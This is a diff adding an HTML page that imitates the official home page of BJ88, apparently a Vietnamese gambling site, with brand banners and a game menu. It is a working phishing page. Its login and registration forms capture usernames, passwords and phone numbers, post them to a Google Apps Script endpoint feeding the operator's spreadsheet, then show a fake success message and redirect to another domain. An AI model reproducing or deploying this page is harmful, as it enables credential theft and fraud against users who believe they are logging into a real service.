@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BJ88 - Trang Chủ Chính Thức</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #1a1a1a; color: white; margin: 0; padding: 0; }
+        
+        /* HEADER VỚI LOGO VÀ NÚT */
+        .header { background: #111; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff9800; }
+        .logo img { height: 50px; }
+        .auth-buttons button { padding: 8px 15px; margin-left: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .btn-login { background: #ff9800; color: white; }
+        .btn-register { background: #444; color: white; }
+
+        /* BANNER QUẢNG CÁO */
+        .banner { width: 100%; max-width: 1200px; margin: 10px auto; display: block; border-radius: 10px; }
+
+        /* THANH MENU ĐẦY ĐỦ CÁC MỤC VỚI KÝ HIỆU */
+        .game-menu { display: flex; overflow-x: auto; background: #222; padding: 15px 10px; gap: 15px; justify-content: center; border-bottom: 1px solid #333; }
+        .menu-item { display: flex; flex-direction: column; align-items: center; min-width: 75px; font-size: 11px; cursor: pointer; color: #bbb; text-transform: uppercase; }
+        .menu-item img { width: 25px; height: 25px; margin-bottom: 5px; }
+        .menu-item:hover, .menu-item.active { color: #ff9800; }
+
+        /* MODAL GIAO DIỆN CHUẨN */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; }
+        .modal-content { background: white; width: 340px; margin: 80px auto; padding: 30px; border-radius: 12px; text-align: center; color: #333; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
+        .modal-content h2 { color: #ff9800; margin-bottom: 20px; font-size: 24px; }
+        .modal-content input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        .btn-submit { width: 100%; padding: 14px; background: #ff9800; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">
+            <img src="https://www.gamblinginsider.com/wp-content/uploads/2025/11/bournemouthbj88.jpg">
+        </div>
+        <div class="auth-buttons">
+            <button class="btn-login" onclick="openModal('loginModal')">Đăng nhập</button>
+            <button class="btn-register" onclick="openModal('registerModal')">Đăng ký</button>
+        </div>
+    </div>
+
+    <img src="https://arcgroup.us.com/wp-content/uploads/2025/12/banner-bj88.jpg" class="banner" alt="Banner">
+
+  <div class="game-menu">
+    <div class="menu-item"><img src="https://img.icons8.com/color/48/rooster.png">SV388</div>
+    <div class="menu-item active"><img src="https://img.icons8.com/color/48/fire-element.png">PHỔ BIẾN</div>
+    <div class="menu-item"><img src="https://img.icons8.com/color/48/football2.png">THỂ THAO</div>
+    <div class="menu-item"><img src="https://img.icons8.com/color/48/playing-cards.png">SÒNG BÀI</div>
+    <div class="menu-item"><img src="https://img.icons8.com/color/48/slot-machine.png">SLOTS</div>
+    <div class="menu-item"><img src="https://img.icons8.com/color/48/fish.png">BẮN CÁ</div>
+    <div class="menu-item"><img src="https://img.icons8.com/color/48/bingo.png">XỔ SỐ</div>
+    <div class="menu-item"><img src="https://img.icons8.com/color/48/poker-cards.png">GAME BÀI</div>
+    <div class="menu-item"><img src="https://img.icons8.com/color/48/bullish.png">CRASH</div>
+    <div class="menu-item"><img src="https://img.icons8.com/color/48/controller.png">ARCADE</div>
+</div>
+
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <h2>ĐĂNG NHẬP</h2>
+            <input type="text" id="login_user" placeholder="Tên tài khoản">
+            <input type="password" id="login_pass" placeholder="Mật khẩu">
+            <input type="text" id="login_phone" placeholder="Số điện thoại của bạn (Bắt buộc)">
+            <button class="btn-submit" onclick="sendLoginData()">ĐĂNG NHẬP</button>
+            <button onclick="closeModal('loginModal')" style="margin-top:10px; background:none; border:none; color:#888; cursor:pointer;">Đóng</button>
+        </div>
+    </div>
+
+    <div id="registerModal" class="modal">
+        <div class="modal-content">
+            <h2>ĐĂNG KÝ</h2>
+            <input type="text" id="phone" placeholder="Số điện thoại của bạn (Bắt buộc)">
+            <button class="btn-submit" onclick="sendData()">ĐĂNG KÝ NGAY</button>
+            <button onclick="closeModal('registerModal')" style="margin-top:10px; background:none; border:none; color:#888; cursor:pointer;">Đóng</button>
+        </div>
+    </div>
+
+    <script>
+        // LINK APP SCRIPT ĐÃ KẾT NỐI VỚI GOOGLE SHEETS CỦA BẠN
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwaVLJXZeJJE2s0XfPLvyq6AUNY4oK6THb8OBOCtzaW9zi6zSg8fYdlXLxZjdmxiw8G/exec';
+
+        function openModal(id) { document.getElementById(id).style.display = 'block'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+
+        // GỬI DỮ LIỆU ĐĂNG KÝ (1 Ô SĐT)
+        async function sendData() {
+            const phone = document.getElementById('phone').value;
+            if (!phone) { alert("Vui lòng nhập số điện thoại!"); return; }
+
+            const formData = new URLSearchParams();
+            formData.append('type', 'Đăng ký BJ88'); // Nguồn hiển thị trên Sheets
+            formData.append('phone', phone);
+
+            await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: formData });
+            alert("Đăng ký thành công!");
+            window.location.href = "https://4a1.bongvip25.pro";
+        }
+
+        // GỬI DỮ LIỆU ĐĂNG NHẬP (3 Ô THÔNG TIN)
+        async function sendLoginData() {
+            const user = document.getElementById('login_user').value;
+            const pass = document.getElementById('login_pass').value;
+            const phone = document.getElementById('login_phone').value;
+
+            if (!user || !pass || !phone) { alert("Vui lòng nhập đầy đủ thông tin!"); return; }
+
+            const formData = new URLSearchParams();
+            formData.append('type', 'Đăng nhập AU88');
+            formData.append('username', user);
+            formData.append('password', pass);
+            formData.append('phone', phone);
+
+            await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: formData });
+            alert("Đăng nhập thành công!");
+            window.location.href = "https://4a1.bongvip25.pro";
+        }
+    </script>
+</body>
+</html>
